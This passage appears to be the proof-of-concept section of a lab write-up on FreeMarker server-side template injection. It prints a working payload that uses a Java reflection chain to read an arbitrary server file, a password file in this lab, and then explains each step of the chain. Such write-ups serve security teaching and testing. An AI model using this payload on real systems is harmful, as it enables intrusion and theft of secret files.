# 8. Proof of Concept (PoC)

Injected payload (decoded):

```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

Reflection chain executed by the JVM on the server:
product → ProductDto instance (application data)
.getClass() → Class<ProductDto>
.getProtectionDomain() → ProtectionDomain
.getCodeSource() → CodeSource
.getLocation() → URL (application's own code location)
.toURI() → URI
.resolve('/home/carlos/my_password.txt') → URI (arbitrary absolute path)
.toURL() → URL
.openStream() → InputStream
.readAllBytes() → byte[] (raw file contents)

The resulting `byte[]` was serialized by FreeMarker's `?join(" ")` built-in into a space-separated list of decimal ASCII values, since the engine cannot natively print binary data.

